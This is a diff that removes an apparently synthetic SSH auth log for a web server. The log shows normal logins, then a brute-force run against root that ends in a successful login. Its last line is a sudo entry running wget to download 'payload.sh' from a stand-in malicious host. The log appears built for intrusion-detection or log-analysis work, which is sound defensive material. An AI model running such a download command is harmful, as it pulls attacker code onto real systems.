@@ -1,337 +1,1018 @@
-Nov 01 00:00:11 webserver01 sshd[1004]: Accepted publickey for git from 103.21.244.10 port 47228 ssh2: RSA SHA256:abc123def456
-Nov 01 00:00:11 webserver01 sshd[1004]: pam_unix(sshd:session): session opened for user git by (uid=0)
-Nov 01 00:00:29 webserver01 sshd[1007]: Accepted publickey for alice from 14.139.123.45 port 48828 ssh2: RSA SHA256:abc123def456
-Nov 01 00:00:29 webserver01 sshd[1007]: pam_unix(sshd:session): session opened for user alice by (uid=0)
-Nov 01 00:01:07 webserver01 sshd[1010]: Accepted publickey for deploy from 14.139.123.45 port 53984 ssh2: RSA SHA256:abc123def456
-Nov 01 00:01:07 webserver01 sshd[1010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
-Nov 01 00:01:47 webserver01 sshd[1014]: Accepted publickey for frank from 14.139.123.45 port 44964 ssh2: RSA SHA256:abc123def456
-Nov 01 00:01:47 webserver01 sshd[1014]: pam_unix(sshd:session): session opened for user frank by (uid=0)
-Nov 01 00:02:12 webserver01 sshd[1017]: Accepted publickey for git from 49.36.78.145 port 62130 ssh2: RSA SHA256:abc123def456
-Nov 01 00:02:12 webserver01 sshd[1017]: pam_unix(sshd:session): session opened for user git by (uid=0)
-Nov 01 00:02:57 webserver01 sshd[1021]: Accepted publickey for alice from 103.21.244.10 port 44303 ssh2: RSA SHA256:abc123def456
-Nov 01 00:02:57 webserver01 sshd[1021]: pam_unix(sshd:session): session opened for user alice by (uid=0)
-Nov 01 00:03:32 webserver01 sshd[1026]: Accepted publickey for git from 103.21.244.10 port 60581 ssh2: RSA SHA256:abc123def456
-Nov 01 00:03:32 webserver01 sshd[1026]: pam_unix(sshd:session): session opened for user git by (uid=0)
-Nov 01 00:04:06 webserver01 sshd[1029]: Accepted publickey for frank from 49.36.78.145 port 48650 ssh2: RSA SHA256:abc123def456
-Nov 01 00:04:06 webserver01 sshd[1029]: pam_unix(sshd:session): session opened for user frank by (uid=0)
-Nov 01 00:04:13 webserver01 sshd[1033]: Accepted publickey for frank from 14.139.123.45 port 46790 ssh2: RSA SHA256:abc123def456
-Nov 01 00:04:13 webserver01 sshd[1033]: pam_unix(sshd:session): session opened for user frank by (uid=0)
-Nov 01 00:04:55 webserver01 sshd[1034]: Accepted publickey for bob from 49.36.78.145 port 58195 ssh2: RSA SHA256:abc123def456
-Nov 01 00:04:55 webserver01 sshd[1034]: pam_unix(sshd:session): session opened for user bob by (uid=0)
-Nov 01 00:05:04 webserver01 sshd[1038]: Accepted publickey for alice from 106.51.23.89 port 48627 ssh2: RSA SHA256:abc123def456
-Nov 01 00:05:04 webserver01 sshd[1038]: pam_unix(sshd:session): session opened for user alice by (uid=0)
-Nov 01 00:05:31 webserver01 sshd[1043]: Accepted publickey for frank from 49.36.78.145 port 51540 ssh2: RSA SHA256:abc123def456
-Nov 01 00:05:31 webserver01 sshd[1043]: pam_unix(sshd:session): session opened for user frank by (uid=0)
-Nov 01 00:05:55 webserver01 sshd[1046]: Accepted publickey for git from 106.51.23.89 port 64424 ssh2: RSA SHA256:abc123def456
-Nov 01 00:05:55 webserver01 sshd[1046]: pam_unix(sshd:session): session opened for user git by (uid=0)
-Nov 01 00:06:38 webserver01 sshd[1048]: Accepted publickey for git from 157.32.18.201 port 40942 ssh2: RSA SHA256:abc123def456
-Nov 01 00:06:38 webserver01 sshd[1048]: pam_unix(sshd:session): session opened for user git by (uid=0)
-Nov 01 00:07:10 webserver01 sshd[1049]: Accepted publickey for deploy from 106.51.23.89 port 47314 ssh2: RSA SHA256:abc123def456
-Nov 01 00:07:10 webserver01 sshd[1049]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
-Nov 01 00:07:43 webserver01 sshd[1051]: pam_unix(sshd:session): session closed for user alice
-Nov 01 00:07:43 webserver01 sshd[1051]: Disconnected from user alice 157.32.18.201 port 60704
-Nov 01 00:08:21 webserver01 sshd[1052]: pam_unix(sshd:session): session closed for user bob
-Nov 01 00:08:21 webserver01 sshd[1052]: Disconnected from user bob 14.139.123.45 port 50240
-Nov 01 00:08:57 webserver01 sshd[1055]: pam_unix(sshd:session): session closed for user deploy
-Nov 01 00:08:57 webserver01 sshd[1055]: Disconnected from user deploy 106.51.23.89 port 62744
-Nov 01 00:09:16 webserver01 sshd[1057]: pam_unix(sshd:session): session closed for user deploy
-Nov 01 00:09:16 webserver01 sshd[1057]: Disconnected from user deploy 106.51.23.89 port 58900
-Nov 01 00:09:22 webserver01 sshd[1060]: pam_unix(sshd:session): session closed for user deploy
-Nov 01 00:09:22 webserver01 sshd[1060]: Disconnected from user deploy 103.21.244.10 port 59457
-Nov 01 00:09:48 webserver01 sshd[1062]: pam_unix(sshd:session): session closed for user deploy
-Nov 01 00:09:48 webserver01 sshd[1062]: Disconnected from user deploy 157.32.18.201 port 63476
-Nov 01 00:09:55 webserver01 sshd[1065]: pam_unix(sshd:session): session closed for user frank
-Nov 01 00:09:55 webserver01 sshd[1065]: Disconnected from user frank 106.51.23.89 port 48818
-Nov 01 00:10:36 webserver01 sshd[1066]: pam_unix(sshd:session): session closed for user git
-Nov 01 00:10:36 webserver01 sshd[1066]: Disconnected from user git 103.21.244.10 port 44553
-Nov 01 00:11:04 webserver01 sshd[1071]: pam_unix(sshd:session): session closed for user deploy
-Nov 01 00:11:04 webserver01 sshd[1071]: Disconnected from user deploy 103.21.244.10 port 53518
-Nov 01 00:11:32 webserver01 sshd[1076]: pam_unix(sshd:session): session closed for user frank
-Nov 01 00:11:32 webserver01 sshd[1076]: Disconnected from user frank 14.139.123.45 port 52880
-Nov 01 00:11:57 webserver01 sshd[1078]: Failed password for deploy from 14.139.123.45 port 50643 ssh2
-Nov 01 00:11:57 webserver01 sshd[1078]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=deploy
-Nov 01 00:12:24 webserver01 sshd[1083]: Failed password for frank from 14.139.123.45 port 48056 ssh2
-Nov 01 00:12:24 webserver01 sshd[1083]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=frank
-Nov 01 00:12:43 webserver01 sshd[1085]: Failed password for git from 49.36.78.145 port 49034 ssh2
-Nov 01 00:12:43 webserver01 sshd[1085]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145 user=git
-Nov 01 00:12:56 webserver01 sshd[1087]: Failed password for frank from 157.32.18.201 port 54894 ssh2
-Nov 01 00:12:56 webserver01 sshd[1087]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=frank
-Nov 01 00:12:59 webserver01 sshd[1088]: Failed password for deploy from 157.32.18.201 port 59073 ssh2
-Nov 01 00:12:59 webserver01 sshd[1088]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=deploy
-Nov 01 00:13:03 webserver01 sshd[1093]: Failed password for deploy from 14.139.123.45 port 61779 ssh2
-Nov 01 00:13:03 webserver01 sshd[1093]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45 user=deploy
-Nov 01 00:13:39 webserver01 sshd[1094]: Failed password for alice from 106.51.23.89 port 40735 ssh2
-Nov 01 00:13:39 webserver01 sshd[1094]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=106.51.23.89 user=alice
-Nov 01 00:13:51 webserver01 sshd[1099]: Failed password for bob from 157.32.18.201 port 53432 ssh2
-Nov 01 00:13:51 webserver01 sshd[1099]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=157.32.18.201 user=bob
-Nov 01 00:14:20 webserver01 sudo[1104]:     deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl reload nginx
-Nov 01 00:14:20 webserver01 sudo[1104]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)
-Nov 01 00:14:20 webserver01 sudo[1104]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:14:28 webserver01 sudo[1107]:     frank : TTY=pts/2 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/docker ps
-Nov 01 00:14:28 webserver01 sudo[1107]: pam_unix(sudo:session): session opened for user root by frank(uid=1000)
-Nov 01 00:14:28 webserver01 sudo[1107]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:14:55 webserver01 sudo[1109]:     frank : TTY=pts/2 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
-Nov 01 00:14:55 webserver01 sudo[1109]: pam_unix(sudo:session): session opened for user root by frank(uid=1005)
-Nov 01 00:14:55 webserver01 sudo[1109]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:14:59 webserver01 sudo[1111]:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
-Nov 01 00:14:59 webserver01 sudo[1111]: pam_unix(sudo:session): session opened for user root by alice(uid=1002)
-Nov 01 00:14:59 webserver01 sudo[1111]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:15:10 webserver01 sudo[1113]:     git : TTY=pts/2 ; PWD=/home/git ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
-Nov 01 00:15:10 webserver01 sudo[1113]: pam_unix(sudo:session): session opened for user root by git(uid=1004)
-Nov 01 00:15:10 webserver01 sudo[1113]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:15:47 webserver01 sudo[1117]:     bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/systemctl reload nginx
-Nov 01 00:15:47 webserver01 sudo[1117]: pam_unix(sudo:session): session opened for user root by bob(uid=1000)
-Nov 01 00:15:47 webserver01 sudo[1117]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:15:52 webserver01 sudo[1121]:     frank : TTY=pts/1 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
-Nov 01 00:15:52 webserver01 sudo[1121]: pam_unix(sudo:session): session opened for user root by frank(uid=1005)
-Nov 01 00:15:52 webserver01 sudo[1121]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:16:15 webserver01 sudo[1123]:     alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /var/log/nginx/error.log
-Nov 01 00:16:15 webserver01 sudo[1123]: pam_unix(sudo:session): session opened for user root by alice(uid=1005)
-Nov 01 00:16:15 webserver01 sudo[1123]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:16:47 webserver01 sudo[1127]:     git : TTY=pts/1 ; PWD=/home/git ; USER=root ; COMMAND=/usr/bin/docker ps
-Nov 01 00:16:47 webserver01 sudo[1127]: pam_unix(sudo:session): session opened for user root by git(uid=1004)
-Nov 01 00:16:47 webserver01 sudo[1127]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:17:19 webserver01 sudo[1132]:     deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
-Nov 01 00:17:19 webserver01 sudo[1132]: pam_unix(sudo:session): session opened for user root by deploy(uid=1003)
-Nov 01 00:17:19 webserver01 sudo[1132]: pam_unix(sudo:session): session closed for user root
-Nov 01 00:17:51 webserver01 sshd[1137]: Failed password for root from 185.220.101.34 port 62126 ssh2
-Nov 01 00:17:51 webserver01 sshd[1137]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:18:30 webserver01 sshd[1141]: Failed password for root from 185.220.101.34 port 40931 ssh2
-Nov 01 00:18:30 webserver01 sshd[1141]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:19:03 webserver01 sshd[1143]: Failed password for root from 185.220.101.34 port 43404 ssh2
-Nov 01 00:19:03 webserver01 sshd[1143]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:19:44 webserver01 sshd[1147]: Failed password for root from 185.220.101.34 port 44906 ssh2
-Nov 01 00:19:44 webserver01 sshd[1147]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:19:56 webserver01 sshd[1148]: Failed password for root from 185.220.101.34 port 60148 ssh2
-Nov 01 00:19:56 webserver01 sshd[1148]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:20:23 webserver01 sshd[1153]: Failed password for root from 185.220.101.34 port 42780 ssh2
-Nov 01 00:20:23 webserver01 sshd[1153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:21:04 webserver01 sshd[1155]: Failed password for root from 185.220.101.34 port 44655 ssh2
-Nov 01 00:21:04 webserver01 sshd[1155]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:21:38 webserver01 sshd[1156]: Failed password for root from 185.220.101.34 port 64310 ssh2
-Nov 01 00:21:38 webserver01 sshd[1156]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:22:08 webserver01 sshd[1159]: Failed password for root from 185.220.101.34 port 55539 ssh2
-Nov 01 00:22:08 webserver01 sshd[1159]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:22:32 webserver01 sshd[1161]: Failed password for root from 185.220.101.34 port 45294 ssh2
-Nov 01 00:22:32 webserver01 sshd[1161]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:23:13 webserver01 sshd[1166]: Failed password for root from 185.220.101.34 port 41121 ssh2
-Nov 01 00:23:13 webserver01 sshd[1166]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:23:43 webserver01 sshd[1171]: Failed password for root from 185.220.101.34 port 40521 ssh2
-Nov 01 00:23:43 webserver01 sshd[1171]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:23:52 webserver01 sshd[1174]: Failed password for root from 185.220.101.34 port 51511 ssh2
-Nov 01 00:23:52 webserver01 sshd[1174]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:24:24 webserver01 sshd[1177]: Failed password for root from 185.220.101.34 port 53217 ssh2
-Nov 01 00:24:24 webserver01 sshd[1177]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:24:58 webserver01 sshd[1182]: Failed password for root from 185.220.101.34 port 62170 ssh2
-Nov 01 00:24:58 webserver01 sshd[1182]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:25:13 webserver01 sshd[1186]: Failed password for root from 185.220.101.34 port 51518 ssh2
-Nov 01 00:25:13 webserver01 sshd[1186]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:25:15 webserver01 sshd[1187]: Failed password for root from 185.220.101.34 port 57581 ssh2
-Nov 01 00:25:15 webserver01 sshd[1187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:25:30 webserver01 sshd[1192]: Failed password for root from 185.220.101.34 port 51990 ssh2
-Nov 01 00:25:30 webserver01 sshd[1192]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:25:34 webserver01 sshd[1195]: Failed password for root from 185.220.101.34 port 60129 ssh2
-Nov 01 00:25:34 webserver01 sshd[1195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:26:08 webserver01 sshd[1200]: Failed password for root from 185.220.101.34 port 58112 ssh2
-Nov 01 00:26:08 webserver01 sshd[1200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:26:48 webserver01 sshd[1204]: Failed password for root from 185.220.101.34 port 52458 ssh2
-Nov 01 00:26:48 webserver01 sshd[1204]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:26:55 webserver01 sshd[1205]: Failed password for root from 185.220.101.34 port 58949 ssh2
-Nov 01 00:26:55 webserver01 sshd[1205]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:26:58 webserver01 sshd[1208]: Failed password for root from 185.220.101.34 port 52484 ssh2
-Nov 01 00:26:58 webserver01 sshd[1208]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:27:43 webserver01 sshd[1209]: Failed password for root from 185.220.101.34 port 41976 ssh2
-Nov 01 00:27:43 webserver01 sshd[1209]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:27:45 webserver01 sshd[1214]: Failed password for root from 185.220.101.34 port 48759 ssh2
-Nov 01 00:27:45 webserver01 sshd[1214]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:28:20 webserver01 sshd[1219]: Failed password for root from 185.220.101.34 port 45940 ssh2
-Nov 01 00:28:20 webserver01 sshd[1219]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:29:04 webserver01 sshd[1220]: Failed password for root from 185.220.101.34 port 64739 ssh2
-Nov 01 00:29:04 webserver01 sshd[1220]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:29:25 webserver01 sshd[1225]: Failed password for root from 185.220.101.34 port 55881 ssh2
-Nov 01 00:29:25 webserver01 sshd[1225]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:29:29 webserver01 sshd[1228]: Failed password for root from 185.220.101.34 port 58326 ssh2
-Nov 01 00:29:29 webserver01 sshd[1228]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:29:39 webserver01 sshd[1229]: Failed password for root from 185.220.101.34 port 47198 ssh2
-Nov 01 00:29:39 webserver01 sshd[1229]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:30:11 webserver01 sshd[1234]: Failed password for root from 185.220.101.34 port 57477 ssh2
-Nov 01 00:30:11 webserver01 sshd[1234]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:30:40 webserver01 sshd[1239]: Failed password for root from 185.220.101.34 port 52756 ssh2
-Nov 01 00:30:40 webserver01 sshd[1239]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:31:18 webserver01 sshd[1244]: Failed password for root from 185.220.101.34 port 59171 ssh2
-Nov 01 00:31:18 webserver01 sshd[1244]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:31:42 webserver01 sshd[1249]: Failed password for root from 185.220.101.34 port 41234 ssh2
-Nov 01 00:31:42 webserver01 sshd[1249]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:32:08 webserver01 sshd[1251]: Failed password for root from 185.220.101.34 port 49327 ssh2
-Nov 01 00:32:08 webserver01 sshd[1251]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:32:44 webserver01 sshd[1252]: Failed password for root from 185.220.101.34 port 46418 ssh2
-Nov 01 00:32:44 webserver01 sshd[1252]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:32:53 webserver01 sshd[1254]: Failed password for root from 185.220.101.34 port 54857 ssh2
-Nov 01 00:32:53 webserver01 sshd[1254]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:33:29 webserver01 sshd[1257]: Failed password for root from 185.220.101.34 port 50551 ssh2
-Nov 01 00:33:29 webserver01 sshd[1257]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:33:59 webserver01 sshd[1258]: Failed password for root from 185.220.101.34 port 49703 ssh2
-Nov 01 00:33:59 webserver01 sshd[1258]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:34:28 webserver01 sshd[1263]: Failed password for root from 185.220.101.34 port 63011 ssh2
-Nov 01 00:34:28 webserver01 sshd[1263]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root
-Nov 01 00:34:33 webserver01 sshd[1266]: Failed password for root from 185.220.101.34 port 44038 ssh2
-Nov 01 00:34:52 webserver01 sshd[1270]: Failed password for root from 185.220.101.34 port 47190 ssh2
-Nov 01 00:35:05 webserver01 sshd[1273]: Failed password for root from 185.220.101.34 port 55029 ssh2
-Nov 01 00:35:42 webserver01 sshd[1278]: Failed password for root from 185.220.101.34 port 60347 ssh2
-Nov 01 00:35:50 webserver01 sshd[1283]: Failed password for root from 185.220.101.34 port 47290 ssh2
-Nov 01 00:36:22 webserver01 sshd[1287]: Failed password for root from 185.220.101.34 port 50559 ssh2
-Nov 01 00:36:32 webserver01 sshd[1292]: Failed password for root from 185.220.101.34 port 64716 ssh2
-Nov 01 00:37:03 webserver01 sshd[1294]: Failed password for root from 5.188.86.172 port 48584 ssh2
-Nov 01 00:37:28 webserver01 sshd[1299]: Failed password for root from 5.188.86.172 port 53719 ssh2
-Nov 01 00:37:57 webserver01 sshd[1304]: Failed password for root from 5.188.86.172 port 54805 ssh2
-Nov 01 00:38:25 webserver01 sshd[1309]: Failed password for root from 5.188.86.172 port 59062 ssh2
-Nov 01 00:38:28 webserver01 sshd[1314]: Failed password for root from 5.188.86.172 port 61671 ssh2
-Nov 01 00:38:56 webserver01 sshd[1316]: Failed password for root from 5.188.86.172 port 60351 ssh2
-Nov 01 00:39:39 webserver01 sshd[1317]: Failed password for root from 5.188.86.172 port 43812 ssh2
-Nov 01 00:40:18 webserver01 sshd[1319]: Failed password for root from 5.188.86.172 port 48188 ssh2
-Nov 01 00:40:29 webserver01 sshd[1323]: Failed password for root from 5.188.86.172 port 51508 ssh2
-Nov 01 00:40:38 webserver01 sshd[1326]: Failed password for root from 5.188.86.172 port 45304 ssh2
-Nov 01 00:41:00 webserver01 sshd[1328]: Failed password for root from 5.188.86.172 port 48096 ssh2
-Nov 01 00:41:44 webserver01 sshd[1331]: Failed password for root from 5.188.86.172 port 49909 ssh2
-Nov 01 00:42:08 webserver01 sshd[1334]: Failed password for root from 222.186.42.117 port 46962 ssh2
-Nov 01 00:42:38 webserver01 sshd[1338]: Failed password for root from 222.186.42.117 port 45778 ssh2
-Nov 01 00:43:08 webserver01 sshd[1342]: Failed password for root from 222.186.42.117 port 41371 ssh2
-Nov 01 00:43:11 webserver01 sshd[1344]: Failed password for root from 222.186.42.117 port 50630 ssh2
-Nov 01 00:43:20 webserver01 sshd[1345]: Failed password for root from 222.186.42.117 port 40921 ssh2
-Nov 01 00:43:55 webserver01 sshd[1349]: Failed password for root from 222.186.42.117 port 62801 ssh2
-Nov 01 00:44:22 webserver01 sshd[1354]: Failed password for root from 222.186.42.117 port 44666 ssh2
-Nov 01 00:45:00 webserver01 sshd[1358]: Failed password for root from 222.186.42.117 port 42389 ssh2
-Nov 01 00:45:26 webserver01 sshd[1360]: Failed password for root from 222.186.42.117 port 64359 ssh2
-Nov 01 00:45:46 webserver01 sshd[1361]: Failed password for root from 194.165.16.11 port 40197 ssh2
-Nov 01 00:45:58 webserver01 sshd[1365]: Failed password for root from 194.165.16.11 port 40736 ssh2
-Nov 01 00:46:01 webserver01 sshd[1366]: Failed password for root from 194.165.16.11 port 52647 ssh2
-Nov 01 00:46:28 webserver01 sshd[1368]: Failed password for root from 194.165.16.11 port 58841 ssh2
-Nov 01 00:47:10 webserver01 sshd[1371]: Failed password for root from 194.165.16.11 port 64474 ssh2
-Nov 01 00:47:21 webserver01 sshd[1374]: Failed password for root from 194.165.16.11 port 57073 ssh2
-Nov 01 00:47:46 webserver01 sshd[1377]: Failed password for root from 194.165.16.11 port 59536 ssh2
-Nov 01 00:48:06 webserver01 sshd[1381]: Failed password for root from 194.165.16.11 port 64466 ssh2
-Nov 01 00:48:28 webserver01 sshd[1383]: Failed password for root from 194.165.16.11 port 54901 ssh2
-Nov 01 00:49:03 webserver01 sshd[1388]: Failed password for root from 194.165.16.11 port 60080 ssh2
-Nov 01 00:49:33 webserver01 sshd[1391]: Failed password for root from 45.95.168.189 port 43861 ssh2
-Nov 01 00:50:02 webserver01 sshd[1392]: Failed password for root from 45.95.168.189 port 48798 ssh2
-Nov 01 00:50:23 webserver01 sshd[1393]: Failed password for root from 45.95.168.189 port 43881 ssh2
-Nov 01 00:50:43 webserver01 sshd[1394]: Failed password for root from 45.95.168.189 port 49606 ssh2
-Nov 01 00:51:16 webserver01 sshd[1398]: Failed password for root from 45.95.168.189 port 61001 ssh2
-Nov 01 00:51:43 webserver01 sshd[1402]: Failed password for root from 45.95.168.189 port 51574 ssh2
-Nov 01 00:51:53 webserver01 sshd[1404]: Failed password for root from 45.95.168.189 port 46457 ssh2
-Nov 01 00:52:02 webserver01 sshd[1408]: Failed password for root from 45.95.168.189 port 49035 ssh2
-Nov 01 00:52:20 webserver01 sshd[1409]: Failed password for root from 45.95.168.189 port 54060 ssh2
-Nov 01 00:52:25 webserver01 sshd[1412]: Failed password for root from 45.95.168.189 port 51109 ssh2
-Nov 01 00:52:54 webserver01 sshd[1415]: Failed password for root from 45.95.168.189 port 64750 ssh2
-Nov 01 00:53:28 webserver01 sshd[1417]: Invalid user admin from 89.248.167.131 port 45223
-Nov 01 00:53:28 webserver01 sshd[1417]: Connection closed by invalid user admin 89.248.167.131 port 45223 [preauth]
-Nov 01 00:53:43 webserver01 sshd[1418]: Invalid user test from 89.248.167.131 port 61859
-Nov 01 00:53:43 webserver01 sshd[1418]: Connection closed by invalid user test 89.248.167.131 port 61859 [preauth]
-Nov 01 00:53:48 webserver01 sshd[1419]: Invalid user guest from 89.248.167.131 port 47633
-Nov 01 00:53:48 webserver01 sshd[1419]: Connection closed by invalid user guest 89.248.167.131 port 47633 [preauth]
-Nov 01 00:54:13 webserver01 sshd[1421]: Invalid user oracle from 89.248.167.131 port 61634
-Nov 01 00:54:13 webserver01 sshd[1421]: Connection closed by invalid user oracle 89.248.167.131 port 61634 [preauth]
-Nov 01 00:54:36 webserver01 sshd[1424]: Invalid user ubuntu from 89.248.167.131 port 48341
-Nov 01 00:54:36 webserver01 sshd[1424]: Connection closed by invalid user ubuntu 89.248.167.131 port 48341 [preauth]
-Nov 01 00:54:40 webserver01 sshd[1425]: Invalid user pi from 89.248.167.131 port 62077
-Nov 01 00:54:40 webserver01 sshd[1425]: Connection closed by invalid user pi 89.248.167.131 port 62077 [preauth]
-Nov 01 00:55:21 webserver01 sshd[1427]: Invalid user user from 89.248.167.131 port 45556
-Nov 01 00:55:21 webserver01 sshd[1427]: Connection closed by invalid user user 89.248.167.131 port 45556 [preauth]
-Nov 01 00:55:28 webserver01 sshd[1429]: Invalid user support from 89.248.167.131 port 44902
-Nov 01 00:55:28 webserver01 sshd[1429]: Connection closed by invalid user support 89.248.167.131 port 44902 [preauth]
-Nov 01 00:55:43 webserver01 sshd[1431]: Invalid user ftpuser from 89.248.167.131 port 43588
-Nov 01 00:55:43 webserver01 sshd[1431]: Connection closed by invalid user ftpuser 89.248.167.131 port 43588 [preauth]
-Nov 01 00:55:53 webserver01 sshd[1436]: Accepted password for root from 185.220.101.34 port 61400 ssh2
-Nov 01 00:55:53 webserver01 sshd[1436]: pam_unix(sshd:session): session opened for user root by (uid=0)
-Nov 01 00:56:08 webserver01 sudo[1438]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
-Nov 01 00:56:36 webserver01 sudo[1439]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.com/payload.sh
